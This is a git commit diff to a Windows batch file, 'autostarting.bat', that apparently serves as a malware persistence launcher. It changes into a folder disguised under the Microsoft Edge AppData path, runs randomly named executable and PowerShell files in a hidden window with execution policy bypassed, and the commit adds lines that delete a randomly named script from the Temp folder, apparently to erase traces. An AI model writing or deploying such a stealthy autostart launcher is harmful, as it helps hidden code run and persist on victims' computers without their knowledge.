e01f6aa6d1e0793ce7891e7a2c36e454caf02e8b
Mirozo <82079025+MirozoPL@users.noreply.github.com>
2022-12-11 21:36:54 +0100

    Update autostarting.bat

--- autostarting.bat
+++ autostarting.bat
@@ -1,3 +1,6 @@
 @ECHO OFF
 cd %userprofile%\AppData\Local\MicrosoftEdge\404eb8b50ea0d5d6
 start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'ygoLa8SyqmQTGsoh.exe';.\LhFDtKhHgdiXDSt3.ps1
+if exist %userprofile%\AppData\Local\Temp\G8vGMjXDhui78YqB.ps1 (
+    del %userprofile%\AppData\Local\Temp\G8vGMjXDhui78YqB.ps1
+)
